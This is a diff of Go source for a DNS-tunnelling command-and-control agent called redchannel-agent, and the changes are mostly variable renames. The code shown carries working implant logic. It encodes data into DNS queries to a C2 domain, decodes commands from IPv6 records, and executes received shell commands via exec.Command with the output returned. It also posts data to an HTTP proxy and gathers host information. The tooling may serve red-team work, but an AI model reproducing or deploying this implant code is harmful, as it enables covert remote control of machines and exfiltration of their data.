@@ -18,8 +18,8 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/slackr/redchannel-agent/config"
 	"github.com/miekg/dns"
+	"github.com/slackr/redchannel-agent/config"
 )
 
 /** String obfuscation from https://github.com/unixpickle/gobfuscate
@@ -77,7 +77,7 @@ type Agent struct {
 	crypto   Crypto
 	sendq    map[string]AgentCommand                    // map["010FF.chunk"] = 0xff
 	recvq    map[AgentCommand]map[string]map[int][]byte // map[0x01] = ["data_id"] = [0 = chunk1, 1 = chunk2]
-	sent_key bool
+	sentKey bool
 	config   config.Config
 	shutdown bool
 }
@@ -113,9 +113,9 @@ func (a *Agent) NewKeys() {
 // CheckIn queues up a CHECKIN command with dummy data
 func (a *Agent) CheckIn() {
 	if a.config.ProxyEnabled == true {
-		var proxy_data = a.GetFromProxy()
-		if len(proxy_data) > 0 {
-			a.ProcessResponse(proxy_data)
+		var proxyData = a.GetFromProxy()
+		if len(proxyData) > 0 {
+			a.ProcessResponse(proxyData)
 		} else {
 			log.Printf("no data from proxy c2\n")
 		}
@@ -154,22 +154,22 @@ func (a *Agent) Keyx() {
 func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
 	data := BytesToHexString(bytes)
 
-	split_regex := fmt.Sprintf("[a-f0-9]{1,%d}", SENDQ_CHUNK_LEN)
-	chunks := regexp.MustCompile(split_regex).FindAllString(data, -1)
-	total_chunks := len(chunks)
+	chunkSplitRegex := fmt.Sprintf("[a-f0-9]{1,%d}", SENDQ_CHUNK_LEN)
+	chunks := regexp.MustCompile(chunkSplitRegex).FindAllString(data, -1)
+	totalChunks := len(chunks)
 
 	// unique-ish identifier for each sent command to aide in reconstruction
-	data_identifier := a.crypto.RandomHexString(DATA_ID_LEN)
+	dataId := a.crypto.RandomHexString(DATA_ID_LEN)
 
-	for chunk_num, chunk_data := range chunks {
+	for chunkNumber, chunkData := range chunks {
 		//log.Printf("chunk %d: %s\n", chunk_num, chunk_data)
 
 		// [agent_id].[command][chunk_num][chunk_total].[data_id].[chunk].c2
-		q := fmt.Sprintf("%s.%02x%02x%02x.%s.%s", a.id, command, chunk_num, total_chunks, data_identifier, chunk_data)
+		queueMessage := fmt.Sprintf("%s.%02x%02x%02x.%s.%s", a.id, command, chunkNumber, totalChunks, dataId, chunkData)
 		//log.Printf("q: %s\n", q)
 
 		// TODO: need a better structure
-		a.sendq[q] = command
+		a.sendq[queueMessage] = command
 	}
 }
 
@@ -195,24 +195,24 @@ func (a *Agent) ProcessSendQ() {
 	if a.config.ProxyEnabled == true {
 		var data []string
 
-		var commands_sent []AgentCommand
+		var commandsSent []AgentCommand
 		for item, command := range a.sendq {
-			anticache := a.crypto.RandomHexString(4)
-			segment := anticache + "." + item
+			antiCacheValue := a.crypto.RandomHexString(4)
+			segment := antiCacheValue + "." + item
 			data = append(data, segment)
-			commands_sent = append(commands_sent, command)
+			commandsSent = append(commandsSent, command)
 		}
 		if len(data) > 0 {
 			a.SendToProxy(data)
-			for i := range commands_sent {
-				a.CleanupSendQ(commands_sent[i])
+			for i := range commandsSent {
+				a.CleanupSendQ(commandsSent[i])
 			}
 		}
 	} else {
 		for item := range a.sendq {
 			// first 4 bytes will be randomized for every request to prevent dns caching
-			anticache := a.crypto.RandomHexString(4)
-			query := anticache + "." + item + "." + a.config.C2Domain
+			antiCacheValue := a.crypto.RandomHexString(4)
+			query := antiCacheValue + "." + item + "." + a.config.C2Domain
 
 			// var err error
 			var response []string
@@ -286,26 +286,26 @@ func (a *Agent) ProcessSendQ() {
 func (a *Agent) ProcessResponse(response []string) {
 	var err error
 	command := 0
-	total_records := 0
-	padded_bytes_count := 0
-	var data_id string
+	totalRecords := 0
+	paddedBytesCount := 0
+	var dataId string
 
-	header_found := false
+	headerFound := false
 
 	// look for the header because fucking go doesn't return the records in order
-	header_index := 0
+	headerIndex := 0
 	for i := range response {
 		if strings.HasPrefix(response[i], RECORD_HEADER_PREFIX) == true {
-			header_found = true
-			header_index = i
+			headerFound = true
+			headerIndex = i
 
 			ipv6 := net.ParseIP(response[i])
 			if ipv6 == nil {
 				log.Printf("error parsing ipv6 in c2 response: %q, invalid ip\n", response[i])
 				return
 			}
-			expanded_ipv6 := ExpandIPv6(ipv6)
-			blocks := strings.Split(expanded_ipv6, ":")
+			expandedIpv6 := ExpandIPv6(ipv6)
+			blocks := strings.Split(expandedIpv6, ":")
 
 			command, err = HexBytesToInt(blocks[2][:2])
 			if err != nil {
@@ -317,22 +317,22 @@ func (a *Agent) ProcessResponse(response []string) {
 				return
 			}
 
-			data_id = blocks[1]
+			dataId = blocks[1]
 			if _, ok := a.recvq[AgentCommand(command)]; !ok {
 				a.recvq[AgentCommand(command)] = map[string]map[int][]byte{}
 			}
-			if _, ok2 := a.recvq[AgentCommand(command)][data_id]; !ok2 {
+			if _, ok2 := a.recvq[AgentCommand(command)][dataId]; !ok2 {
 				delete(a.recvq, AgentCommand(command)) // delete old command data
 				a.recvq[AgentCommand(command)] = map[string]map[int][]byte{}
-				a.recvq[AgentCommand(command)][data_id] = map[int][]byte{}
+				a.recvq[AgentCommand(command)][dataId] = map[int][]byte{}
 			}
 
-			padded_bytes_count, err = HexBytesToInt(blocks[2][2:4])
+			paddedBytesCount, err = HexBytesToInt(blocks[2][2:4])
 			if err != nil {
 				log.Printf("error decoding padded bytes count from c2 response: %q, (err: %q)\n", response[i], err)
 				return
 			}
-			total_records, err = HexBytesToInt(blocks[3])
+			totalRecords, err = HexBytesToInt(blocks[3])
 			if err != nil {
 				log.Printf("error decoding total records from c2 response: %q, (err: %q)\n", response[i], err)
 				return
@@ -340,13 +340,13 @@ func (a *Agent) ProcessResponse(response []string) {
 		}
 	}
 
-	if !header_found {
+	if !headerFound {
 		log.Printf("error, no header found in c2 response: %q\n", response)
 		return
 	}
 
 	// remove the header
-	response = append(response[:header_index], response[header_index+1:]...)
+	response = append(response[:headerIndex], response[headerIndex+1:]...)
 
 	for i := range response {
 		if len(response[i]) < 10 {
@@ -357,26 +357,26 @@ func (a *Agent) ProcessResponse(response []string) {
 			log.Printf("error parsing ipv6 in c2 response: %q, invalid ip\n", response[i])
 			return
 		}
-		expanded_ipv6 := ExpandIPv6(ipv6)
-		blocks := strings.Split(expanded_ipv6, ":")
+		expandedIpv6 := ExpandIPv6(ipv6)
+		blocks := strings.Split(expandedIpv6, ":")
 
-		record_num, err := HexBytesToInt(blocks[1])
+		recordNumber, err := HexBytesToInt(blocks[1])
 		if err != nil {
 			log.Printf("error decoding record num from c2 response: %q, (err: %q)\n", response[i], err)
 			return
 		}
-		data_string := strings.Join(blocks[2:], "")
-		data, err := HexStringToBytes(data_string)
+		dataString := strings.Join(blocks[2:], "")
+		data, err := HexStringToBytes(dataString)
 		if err != nil {
 			log.Printf("error decoding data from c2 response: %q, (err: %q)\n", response[i], err)
 			return
 		}
 
-		a.recvq[AgentCommand(command)][data_id][record_num] = data
+		a.recvq[AgentCommand(command)][dataId][recordNumber] = data
 
-		received_records := len(a.recvq[AgentCommand(command)][data_id])
-		if received_records == total_records {
-			a.ProcessRecvQ(AgentCommand(command), data_id, padded_bytes_count)
+		receivedRecords := len(a.recvq[AgentCommand(command)][dataId])
+		if receivedRecords == totalRecords {
+			a.ProcessRecvQ(AgentCommand(command), dataId, paddedBytesCount)
 		}
 		//log.Printf("r %d / %d\n", received_records, total_records)
 	}
@@ -385,15 +385,15 @@ func (a *Agent) ProcessResponse(response []string) {
 func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_count int) {
 	var data []byte
 
-	sorted_recs := make([]int, len(a.recvq[command][data_id]))
+	sortedRecords := make([]int, len(a.recvq[command][data_id]))
 	for rec := range a.recvq[command][data_id] {
-		sorted_recs = append(sorted_recs, rec)
+		sortedRecords = append(sortedRecords, rec)
 	}
-	sort.Ints(sorted_recs)
+	sort.Ints(sortedRecords)
 
-	for record_num := range sorted_recs {
-		for i := range a.recvq[command][data_id][record_num] {
-			data = append(data, a.recvq[command][data_id][record_num][i])
+	for recordNumber := range sortedRecords {
+		for i := range a.recvq[command][data_id][recordNumber] {
+			data = append(data, a.recvq[command][data_id][recordNumber][i])
 		}
 	}
 
@@ -412,7 +412,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		return
 	}
 
-	decrypted_data, err := a.crypto.DecryptAesCbc(data, a.crypto.secret)
+	decryptedData, err := a.crypto.DecryptAesCbc(data, a.crypto.secret)
 	if err != nil {
 		log.Printf("error decrypting data for command %q: %x (err: %q)\n", command, data, err)
 		return
@@ -425,7 +425,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		a.SendEncrypted([]byte(sysinfo), AGENT_SYSINFO)
 		break
 	case AGENT_SHELL:
-		cmd := string(decrypted_data)
+		cmd := string(decryptedData)
 		args := strings.Fields(cmd)
 		go func() {
 			out, err := exec.Command(args[0], args[1:]...).Output()
@@ -439,12 +439,12 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		}()
 		break
 	case AGENT_SET_CONFIG:
-		cmd := string(decrypted_data)
+		cmd := string(decryptedData)
 		setting := strings.Split(cmd, "=")
-		setting_name := setting[0]
-		setting_value := setting[1]
+		settingName := setting[0]
+		settingValue := setting[1]
 
-		switch setting_name {
+		switch settingName {
 		/* cannot set domain and password dynamically
 		// case "d":
 		// 	a.config.C2Domain = setting_value
@@ -457,25 +457,25 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		// 	break
 		*/
 		case "i":
-			i, err := strconv.Atoi(setting_value)
+			i, err := strconv.Atoi(settingValue)
 			if err != nil {
 				a.SendEncrypted([]byte("error: invalid interval"), AGENT_MSG)
 				break
 			}
 			a.config.C2Interval = i
-			a.SendEncrypted([]byte("config: c2 interval updated, "+setting_value), AGENT_MSG)
+			a.SendEncrypted([]byte("config: c2 interval updated, "+settingValue), AGENT_MSG)
 			break
 
 		case "pk":
-			a.config.ProxyKey = setting_value
+			a.config.ProxyKey = settingValue
 			a.SendEncrypted([]byte("config: proxy_key updated"), AGENT_MSG)
 			break
 		case "pu":
-			a.config.ProxyUrl = setting_value
+			a.config.ProxyUrl = settingValue
 			a.SendEncrypted([]byte("config: proxy_url updated"), AGENT_MSG)
 			break
 		case "pe":
-			if setting_value == "true" {
+			if settingValue == "true" {
 				if len(a.config.ProxyUrl) == 0 {
 					a.SendEncrypted([]byte("error: no proxy url"), AGENT_MSG)
 					break
@@ -494,7 +494,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		}
 		break
 	case AGENT_MSG:
-		log.Printf("msg> %s\n", decrypted_data)
+		log.Printf("msg> %s\n", decryptedData)
 		break
 	case AGENT_SHUTDOWN:
 		log.Printf("shutting down...\n")
@@ -506,16 +506,16 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 }
 
 func (a *Agent) SendToProxy(data []string) {
-	str_data := strings.Join(data, PROXY_DATA_SEPARATOR) + PROXY_DATA_SEPARATOR
-	log.Printf("sending data to proxy: %s\n", str_data)
+	dataString := strings.Join(data, PROXY_DATA_SEPARATOR) + PROXY_DATA_SEPARATOR
+	log.Printf("sending data to proxy: %s\n", dataString)
 
-	form_data := url.Values{
+	formData := url.Values{
 		"p": {"a"},
 		"k": {a.config.ProxyKey},
-		"d": {str_data},
+		"d": {dataString},
 	}
 
-	resp, err := http.PostForm(a.config.ProxyUrl, form_data)
+	resp, err := http.PostForm(a.config.ProxyUrl, formData)
 	if err != nil {
 		log.Printf("could not send to proxy, err: %s\n", err)
 		return
@@ -545,6 +545,7 @@ func (a *Agent) GetFromProxy() []string {
 	defer resp.Body.Close()
 	body, err := ioutil.ReadAll(resp.Body)
 
+	// TODO: handle proxy response for OK_NO_DATA
 	if len(body) > 0 {
 		log.Printf("proxy get response: '%s'\n", string(body))
 		data = strings.Split(string(body), PROXY_DATA_SEPARATOR)
@@ -586,9 +587,9 @@ func (a *Agent) NewAgentID() {
 			as = append(as, hostname)
 		}
 		hash := md5.Sum([]byte(strings.Join(as, "")))
-		hash_string := BytesToHexString(hash[:])
+		hashString := BytesToHexString(hash[:])
 
-		a.id = hash_string[:AGENT_ID_LEN]
+		a.id = hashString[:AGENT_ID_LEN]
 	}
 }
 
@@ -601,12 +602,12 @@ func (a *Agent) GetSysInfo() string {
 	}
 
 	var ips = ""
-	addrs, err := net.InterfaceAddrs()
+	interfaceAddresses, err := net.InterfaceAddrs()
 	if err != nil {
 		ips = "_"
 	}
 
-	for _, a := range addrs {
+	for _, a := range interfaceAddresses {
 		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
 			if ipnet.IP.To4() != nil {
 				ip := ipnet.IP.String()
